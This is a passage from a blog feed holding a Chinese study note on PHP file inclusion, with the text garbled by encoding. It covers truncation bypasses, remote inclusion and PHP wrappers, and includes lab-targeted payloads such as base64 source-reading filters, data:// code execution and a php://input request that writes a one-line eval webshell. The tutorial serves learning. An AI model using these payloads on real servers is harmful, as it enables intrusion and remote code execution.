ä¸€ä¸ª.<code>html</code>ã€‚</p><p><strong>%00æˆªæ–­ç»•è¿‡</strong></p><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>magic_quotes_gpc = Off</li><li>phpç‰ˆæœ¬&lt;5.3.4</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852172.png" alt="image-20210914210252910"></p><p><strong>é•¿åº¦æˆªæ–­ç»•è¿‡</strong></p><p>åˆ©ç”¨æ¡ä»¶</p><p>windowsï¼Œç‚¹å·éœ€è¦é•¿äº250;linuxé•¿äº4096</p><p>å¥½åƒç»•è¿‡ä¸å»äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><h3 id="è¿œç¨‹æ–‡ä»¶åŒ…å«-å±å®³æ›´å¤§"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«-å±å®³æ›´å¤§" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«(å±å®³æ›´å¤§)"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«(å±å®³æ›´å¤§)</h3><p>æ–‡ä»¶å’Œç½‘ç«™ä¸åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œç±»ä¼¼åƒ127.0.0.1/?file=<a href="http://www.baidu.comè¿™æ ·å°±å±äºè¿œç¨‹æ–‡ä»¶åŒ…å«./">www.baidu.comè¿™æ ·å°±å±äºè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</a></p><h4 id="ç±»å‹-1"><a href="#ç±»å‹-1" class="headerlink" title="ç±»å‹"></a>ç±»å‹</h4><p><strong>å‰ææ¡ä»¶</strong></p><ul><li>allow_url_fopenï¼šä¸ºONæ—¶ï¼Œèƒ½è¯»å–è¿œç¨‹æ–‡ä»¶ï¼Œä¾‹å¦‚file_get_contents()å°±èƒ½è¯»å–è¿œç¨‹æ–‡ä»¶</li><li>allow_url_include:ä¸ºONæ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨includeå’Œrequireçš„æ–¹å¼åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚</li></ul><p><strong>æ— é™åˆ¶</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852180.png" alt="image-20210914211218583"></p><p>å¦‚æœè¿œç¨‹ä»£ç æ—¶åé—¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿œç¨‹æ–‡ä»¶åŒ…å«ä»è€Œè·å–webshellã€‚</p><p><strong>æœ‰é™åˆ¶</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855217.png" alt="image-20210921085504128"></p><p>é€šè¿‡åœ¨åé¢å¢åŠ ç‰¹æ®Šç¬¦å·æ¥ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20ã€%23ã€?</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855702.png" alt="image-20210921085513609"></p><h3 id="å„ç§åè®®æµçš„ç©æ³•"><a href="#å„ç§åè®®æµçš„ç©æ³•" class="headerlink" title="å„ç§åè®®æµçš„ç©æ³•"></a>å„ç§åè®®æµçš„ç©æ³•</h3><h3 id="PHPä¼ªåè®®æ€»ç»“"><a href="#PHPä¼ªåè®®æ€»ç»“" class="headerlink" title="PHPä¼ªåè®®æ€»ç»“"></a>PHPä¼ªåè®®æ€»ç»“</h3><h4 id="file-åè®®"><a href="#file-åè®®" class="headerlink" title="file:// åè®®"></a><code>file://</code> åè®®</h4><h5 id="ä½¿ç”¨æ¡ä»¶ï¼š"><a href="#ä½¿ç”¨æ¡ä»¶ï¼š" class="headerlink" title="ä½¿ç”¨æ¡ä»¶ï¼š"></a>ä½¿ç”¨æ¡ä»¶ï¼š</h5><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_fopen</code>:off/on</li></ul><h5 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h5><p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—<code>allow_url_fopen</code>ä¸<code>allow_url_include</code>çš„å½±å“ã€‚<br><code>include()/require()/include_once()/require_once()</code>å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œå¦‚å¯¼å…¥ä¸ºé<code>.php</code>æ–‡ä»¶ï¼Œåˆ™ä»æŒ‰ç…§phpè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ˜¯<code>include()</code>å‡½æ•°æ‰€å†³å®šçš„ã€‚</p><h5 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h5><p><em>æ–‡ä»¶ç³»ç»Ÿ</em> æ˜¯ PHP ä½¿ç”¨çš„é»˜è®¤å°è£…åè®®ï¼Œå±•ç°äº†æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚   å½“æŒ‡å®šäº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼ˆä¸ä»¥/ã€\ã€\æˆ– Windows ç›˜ç¬¦å¼€å¤´çš„è·¯å¾„ï¼‰æä¾›çš„è·¯å¾„å°†åŸºäºå½“å‰çš„å·¥ä½œç›®å½•ã€‚   åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯è„šæœ¬æ‰€åœ¨çš„ç›®å½•ï¼Œé™¤éè¢«ä¿®æ”¹äº†ã€‚   ä½¿ç”¨ CLI çš„æ—¶å€™ï¼Œç›®å½•é»˜è®¤æ˜¯è„šæœ¬è¢«è°ƒç”¨æ—¶æ‰€åœ¨çš„ç›®å½•ã€‚åœ¨æŸäº›å‡½æ•°é‡Œï¼Œä¾‹å¦‚ <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a> å’Œ <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>ï¼Œ   <code>include_path</code> ä¼šå¯é€‰åœ°æœç´¢ï¼Œä¹Ÿä½œä¸ºç›¸å¯¹çš„è·¯å¾„ã€‚  </p><h5 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure><h5 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h5><p>1.file://[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=file://D:\phpstudy\www\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855507.png" alt="image-20210921085524443"></p><p>2.[æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=../phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210852850.png" alt="image-20210321183305055"></p><p>3.[httpï¼š//ç½‘ç»œè·¯å¾„å’Œæ–‡ä»¶å]</p><p>è¿™é‡Œè¿›è¡Œè¿œç¨‹è®¿é—®çš„æ—¶å€™éœ€è¦<code>allow_url_include=On</code>æ¨¡å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109210855978.png" alt="image-20210921085534907"></p><h4 id="php-åè®®"><a href="#php-åè®®" class="headerlink" title="php:// åè®®"></a>php:// åè®®</h4><ul><li><h5 id="æ¡ä»¶ï¼š"><a href="#æ¡ä»¶ï¼š" class="headerlink" title="æ¡ä»¶ï¼š"></a>æ¡ä»¶ï¼š</h5><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :ä»…<code>php://input php://stdin php://memory php://temp </code>éœ€è¦on</li></ul></li><li><h5 id="ä½œç”¨ï¼š"><a href="#ä½œç”¨ï¼š" class="headerlink" title="ä½œç”¨ï¼š"></a>ä½œç”¨ï¼š</h5><p><code>php://</code> è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code>ï¼Œ<code>php://filter</code>ç”¨äº<strong>è¯»å–æºç </strong>ï¼Œ<code>php://input</code>ç”¨äº<strong>æ‰§è¡Œphpä»£ç </strong>ã€‚</p></li><li><h5 id="è¯´æ˜ï¼š"><a href="#è¯´æ˜ï¼š" class="headerlink" title="è¯´æ˜ï¼š"></a>è¯´æ˜ï¼š</h5><p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ<br>å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p><table><thead><tr><th>åè®®</th><th align="left">ä½œç”¨</th></tr></thead><tbody><tr><td>php://input</td><td align="left">å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„<code>data</code>éƒ¨åˆ†ï¼Œåœ¨<code>enctype=&quot;multipart/form-data&quot;</code> çš„æ—¶å€™<code>php://input </code>æ˜¯æ— æ•ˆçš„ã€‚</td></tr><tr><td>php://output</td><td align="left">åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</td></tr><tr><td>php://fd</td><td align="left">(&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ <code>php://fd/3</code> å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚</td></tr><tr><td>php://memory php://temp</td><td align="left">(&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ <code>php://memory</code> æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ <code>php://temp</code> ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ <code>2MB</code>ï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ <code>sys_get_temp_dir()</code> çš„æ–¹å¼ä¸€è‡´ã€‚</td></tr><tr><td>php://filter</td><td align="left">(&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼<code>ï¼ˆall-in-oneï¼‰</code>çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ <code>readfile()</code>ã€<code>file()</code> å’Œ <code>file_get_contents()</code>ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚</td></tr></tbody></table></li><li><h5 id="php-filter-å‚æ•°è¯¦è§£"><a href="#php-filter-å‚æ•°è¯¦è§£" class="headerlink" title="php://filter  å‚æ•°è¯¦è§£"></a>php://filter  å‚æ•°è¯¦è§£</h5><p>è¯¥åè®®çš„å‚æ•°ä¼šåœ¨è¯¥åè®®è·¯å¾„ä¸Šè¿›è¡Œä¼ é€’ï¼Œå¤šä¸ªå‚æ•°éƒ½å¯ä»¥åœ¨ä¸€ä¸ªè·¯å¾„ä¸Šä¼ é€’ã€‚å…·ä½“å‚è€ƒå¦‚ä¸‹ï¼š</p><table><thead><tr><th>php://filter å‚æ•°</th><th>æè¿°</th><th></th></tr></thead><tbody><tr><td>resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;</td><td>å¿…é¡»é¡¹ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚</td><td></td></tr><tr><td>read=&lt;è¯»é“¾çš„è¿‡æ»¤å™¨&gt;</td><td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ*\</td><td>*ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>write=&lt;å†™é“¾çš„è¿‡æ»¤å™¨&gt;</td><td>å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ\</td><td>ï¼‰åˆ†éš”ã€‚</td></tr><tr><td>&lt;; ä¸¤ä¸ªé“¾çš„è¿‡æ»¤å™¨&gt;</td><td>ä»»ä½•æ²¡æœ‰ä»¥ <em>read=</em> æˆ– <em>write=</em> ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</td><td></td></tr></tbody></table></li><li><h5 id="å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰"><a href="#å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰" class="headerlink" title="å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰"></a>å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰</h5><p>æ­¤å¤„åˆ—ä¸¾ä¸»è¦çš„è¿‡æ»¤å™¨ç±»å‹ï¼Œè¯¦ç»†å†…å®¹è¯·å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><table><thead><tr><th>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>string.rot13</td><td>ç­‰åŒäº<code>str_rot13()</code>ï¼Œrot13å˜æ¢</td></tr><tr><td>string.toupper</td><td>ç­‰åŒäº<code>strtoupper()</code>ï¼Œè½¬å¤§å†™å­—æ¯</td></tr><tr><td>string.tolower</td><td>ç­‰åŒäº<code>strtolower()</code>ï¼Œè½¬å°å†™å­—æ¯</td></tr><tr><td>string.strip_tags</td><td>ç­‰åŒäº<code>strip_tags()</code>ï¼Œå»é™¤htmlã€PHPè¯­è¨€æ ‡ç­¾</td></tr></tbody></table><table><thead><tr><th>è½¬æ¢è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>ç­‰åŒäº<code>base64_encode()</code>å’Œ<code>base64_decode()</code>ï¼Œbase64ç¼–ç è§£ç </td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable å­—ç¬¦ä¸²ä¸ 8-bit å­—ç¬¦ä¸²ç¼–ç è§£ç </td></tr></tbody></table><table><thead><tr><th>å‹ç¼©è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º gzip å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>åŒä¸Šï¼Œåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ã€‚</td></tr></tbody></table><table><thead><tr><th>åŠ å¯†è¿‡æ»¤å™¨</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt å¯¹ç§°åŠ å¯†ç®—æ³•</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt å¯¹ç§°è§£å¯†ç®—æ³•</td></tr></tbody></table></li><li><p><strong>ç¤ºä¾‹</strong>ï¼š</p><ol><li><p><code>php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]</code>è¯»å–æ–‡ä»¶æºç ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure></li><li><p><code>php://input + [POST DATA]</code>æ‰§è¡Œphpä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATAéƒ¨åˆ†]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>è‹¥æœ‰å†™å…¥æƒé™ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATAéƒ¨åˆ†]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>å‚è€ƒ</strong>ï¼š<a href="https://php.net/manual/zh/wrappers.php.php">https://php.net/manual/zh/wrappers.php.php</a></p></li></ul><h4 id="zip-amp-bzip2-amp-zlib-åè®®"><a href="#zip-amp-bzip2-amp-zlib-åè®®" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// åè®®"></a>zip:// &amp; bzip2:// &amp; zlib:// åè®®</h4><ul><li><p><strong>æ¡ä»¶</strong>ï¼š</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>ä½œç”¨</strong>ï¼š<code>zip:// &amp; bzip2:// &amp; zlib://</code> å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼š<code>jpg png gif xxx</code> ç­‰ç­‰ã€‚  </p></li><li><p><strong>ç¤ºä¾‹</strong>ï¼š</p><ol><li><p><code>zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]</code>ï¼ˆ#ç¼–ç ä¸º%23ï¼‰</p><p>å‹ç¼© phpinfo.txt ä¸º phpinfo.zip ï¼Œå‹ç¼©åŒ…é‡å‘½åä¸º phpinfo.jpg ï¼Œå¹¶ä¸Šä¼ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure></li><li><p><code>compress.bzip2://file.bz2</code></p><p>å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure></li><li><p><code>compress.zlib://file.gz</code></p><p>å‹ç¼© phpinfo.txt ä¸º phpinfo.gz å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure></li></ol></li><li><p><strong>å‚è€ƒ</strong>ï¼š<a href="http://php.net/manual/zh/wrappers.compression.php">http://php.net/manual/zh/wrappers.compression.php</a></p></li></ul><h4 id="data-åè®®"><a href="#data-åè®®" class="headerlink" title="data://åè®®"></a>data://åè®®</h4><ul><li><p><strong>æ¡ä»¶</strong>ï¼š</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>ä½œç”¨</strong>ï¼šè‡ª<code>PHP&gt;=5.2.0</code>èµ·ï¼Œå¯ä»¥ä½¿ç”¨<code>data://</code>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚</p></li><li><p><strong>ç”¨æ³•</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>ç¤ºä¾‹</strong>ï¼š</p><ol><li><p><code>data://text/plain,</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>data://text/plain;base64,</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></li></ol></li></ul><h4 id="http-amp-https-åè®®"><a href="#http-amp-https-åè®®" class="headerlink" title="http:// &amp; https://åè®®"></a>http:// &amp; https://åè®®</h4><ul><li><p><strong>æ¡ä»¶</strong>ï¼š</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>ä½œç”¨</strong>ï¼šå¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ <code>HTTP 1.0</code> çš„ GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å«ã€‚</p></li><li><p><strong>ç”¨æ³•</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="phar-åè®®"><a href="#phar-åè®®" class="headerlink" title="phar://åè®®"></a>phar://åè®®</h4><p><code>phar://</code>åè®®ä¸<code>zip://</code>ç±»ä¼¼ï¼ŒåŒæ ·å¯ä»¥è®¿é—®zipæ ¼å¼å‹ç¼©åŒ…å†…å®¹ï¼Œåœ¨è¿™é‡Œåªç»™å‡ºä¸€ä¸ªç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p>å¦å¤–åœ¨ Black Hat 2018 å¤§ä¼šä¸Šï¼Œç ”ç©¶äººå‘˜å…¬å¸ƒäº†ä¸€æ¬¾é’ˆå¯¹PHPåº”ç”¨ç¨‹åºçš„å…¨æ–°æ”»å‡»æŠ€æœ¯ï¼š<strong>phar://åè®®å¯¹è±¡æ³¨å…¥æŠ€æœ¯</strong>ã€‚</p><p>å› ä¸ºè¯¥åˆ©ç”¨ç‚¹éœ€è¦æ»¡è¶³ä¸€å®šçš„æ¡ä»¶æ‰èƒ½åˆ©ç”¨ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œé‡Œé¢çš„demoä¹Ÿéå¸¸è¯¦ç»†ï¼Œç•™ä½œä»¥åä¸“é—¨ç ”ç©¶ä¸€ä¸‹ã€‚</p><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://paper.seebug.org/680/">seebug - åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢</a></p></blockquote><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><ul><li><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a></li><li><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=57475">https://www.ichunqiu.com/battalion?t=1&amp;r=57475</a></li><li><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></li><li><a href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>30WEBæ¼æ´-RCEä»£ç åŠå‘½ä»¤æ‰§è¡Œæ¼æ´å…¨è§£</title>
      <link href="/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"/>
      <url>/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/</url>
      
